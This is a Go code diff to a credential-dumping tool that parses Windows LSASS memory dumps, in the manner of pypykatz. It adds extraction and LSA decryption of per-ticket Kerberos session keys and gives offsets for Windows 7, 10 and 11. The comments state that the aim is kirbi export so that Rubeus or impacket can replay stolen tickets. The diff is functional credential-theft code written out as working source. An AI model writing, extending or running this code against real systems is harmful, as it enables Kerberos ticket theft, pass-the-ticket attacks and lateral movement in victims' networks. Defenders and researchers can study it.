@@ -48,6 +48,28 @@ type KerberosLayout struct {
 	TicketBufferLenOffset   uint32 // u32 (the ticket buffer's length)
 	TicketBufferPtrOffset   uint32 // u64 (pointer to the ASN.1 ticket bytes)
 
+	// TicketSessionKey* — offsets of the embedded KIWI_KERBEROS_BUFFER
+	// that holds the per-ticket session key. The session key is what
+	// kirbi-export populates so that downstream tooling (Rubeus,
+	// impacket) can replay the ticket. The long-term account keys
+	// (NTLM/AES128/AES256) live in KIWI_KERBEROS_KEYS_LIST_6 and are
+	// walked separately by walkKerberosHashes.
+	//
+	// Layout of the embedded buffer (8-byte alignment after KeyType):
+	//
+	//	{KeyType DWORD ; pad ; Length DWORD ; Value PBYTE}
+	//
+	// pypykatz reference offsets per variant:
+	//
+	//	TICKET_10_1607 (Win 10 1607+): KeyLen=0xB8 KeyVal=0xC0
+	//	TICKET_11      (Win 11 21H2+): KeyLen=0xB8 KeyVal=0xC0
+	//	TICKET_6       (Win 7 SP1+):   KeyLen=0xA0 KeyVal=0xA8
+	//
+	// Set both to zero to disable session-key extraction (KerberosTicket
+	// .SessionKey stays nil; ToKirbi emits an empty KeyValue).
+	TicketSessionKeyLenOffset uint32 // u32 — Length DWORD
+	TicketSessionKeyPtrOffset uint32 // u64 — pointer to the encrypted bytes
+
 	// TicketNodeSize is the smallest ticket size that covers every
 	// offset above. Set to ≥ TicketBufferPtrOffset+8 — defaults to
 	// 0x180 if zero.
@@ -139,6 +161,13 @@ type KerberosTicket struct {
 	EncType     uint32
 	KVNO        uint32
 	Buffer      []byte
+
+	// SessionKey is the decrypted per-ticket session key — what
+	// downstream Kerberos tooling needs to replay the ticket against
+	// the service. 16 bytes for RC4/AES128, 32 bytes for AES256.
+	// Populated only when the build's KerberosLayout registers
+	// TicketSessionKey* offsets and the LSA decrypt succeeds.
+	SessionKey []byte
 }
 
 // KerberosCredential is the credential payload extracted from a
@@ -186,6 +215,10 @@ func (c *KerberosCredential) wipe() {
 			c.Tickets[i].Buffer[j] = 0
 		}
 		c.Tickets[i].Buffer = nil
+		for j := range c.Tickets[i].SessionKey {
+			c.Tickets[i].SessionKey[j] = 0
+		}
+		c.Tickets[i].SessionKey = nil
 	}
 	c.Tickets = nil
 	c.Found = false
@@ -339,7 +372,7 @@ func decodeKerberosSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) 
 		if flink == 0 {
 			continue
 		}
-		tickets = append(tickets, walkKerberosTickets(r, flink, l)...)
+		tickets = append(tickets, walkKerberosTickets(r, flink, l, lsaKey)...)
 	}
 
 	// Walk per-etype hash entries (chantier II.5 — feeds the
@@ -451,7 +484,7 @@ func walkKerberosHashes(r *reader, sessionVA uint64, sessionNode []byte, pkl Ker
 //   - any ReadVA failure on the next node.
 // In practice every Kerberos cache wraps within ~16 tickets so the
 // cap never trips on a healthy dump.
-func walkKerberosTickets(r *reader, head uint64, l KerberosLayout) []KerberosTicket {
+func walkKerberosTickets(r *reader, head uint64, l KerberosLayout, lsaKey *lsaKey) []KerberosTicket {
 	var out []KerberosTicket
 	// Real Kerberos cache wraps within ~5-20 tickets per session;
 	// 32 is a generous cap that limits junk-ticket runaway when our
@@ -466,7 +499,7 @@ func walkKerberosTickets(r *reader, head uint64, l KerberosLayout) []KerberosTic
 	walked := 0
 	cur := head
 	for cur != 0 && walked < maxTickets {
-		ticket, err := readKerberosTicket(r, cur, l, tnSize)
+		ticket, err := readKerberosTicket(r, cur, l, tnSize, lsaKey)
 		if err != nil {
 			break
 		}
@@ -483,7 +516,10 @@ func walkKerberosTickets(r *reader, head uint64, l KerberosLayout) []KerberosTic
 
 // readKerberosTicket reads one KIWI_KERBEROS_INTERNAL_TICKET at the
 // given VA and projects it through the layout's per-ticket offsets.
-func readKerberosTicket(r *reader, va uint64, l KerberosLayout, tnSize uint32) (KerberosTicket, error) {
+// When lsaKey is non-nil and the layout registers TicketSessionKey*
+// offsets, decrypts the per-ticket session key in place and stores
+// it on the returned KerberosTicket.SessionKey.
+func readKerberosTicket(r *reader, va uint64, l KerberosLayout, tnSize uint32, lsaKey *lsaKey) (KerberosTicket, error) {
 	node, err := r.ReadVA(va, int(tnSize))
 	if err != nil {
 		return KerberosTicket{}, err
@@ -530,6 +566,32 @@ func readKerberosTicket(r *reader, va uint64, l KerberosLayout, tnSize uint32) (
 				out := make([]byte, len(buf))
 				copy(out, buf)
 				t.Buffer = out
+			}
+		}
+	}
+
+	// Per-ticket session key — only when the layout registers the
+	// embedded KIWI_KERBEROS_BUFFER and the LSA crypto chain is
+	// available. The cipher is encrypted with the same lsasrv key
+	// chain as MSV / Wdigest / per-etype hashes; decryption failures
+	// are silent (returned KerberosTicket.SessionKey stays nil and
+	// downstream kirbi export emits an empty KeyValue).
+	if lsaKey != nil &&
+		l.TicketSessionKeyLenOffset+4 <= tnSize &&
+		l.TicketSessionKeyPtrOffset+8 <= tnSize {
+		keyLen := binary.LittleEndian.Uint32(
+			node[l.TicketSessionKeyLenOffset : l.TicketSessionKeyLenOffset+4])
+		keyPtr := binary.LittleEndian.Uint64(
+			node[l.TicketSessionKeyPtrOffset : l.TicketSessionKeyPtrOffset+8])
+		// Cap at 256 — Kerberos long-term + session keys are 16/32
+		// bytes for AES, anything larger is junk from a misaligned
+		// layout. cipher length is the plaintext-aligned ciphertext
+		// (same length as plaintext for stream cipher; AES round-up).
+		if keyLen > 0 && keyLen <= 256 && keyPtr != 0 {
+			if cipher, err := r.ReadVA(keyPtr, int(keyLen)); err == nil {
+				if plain, err := decryptLSA(cipher, lsaKey); err == nil {
+					t.SessionKey = plain
+				}
 			}
 		}
 	}
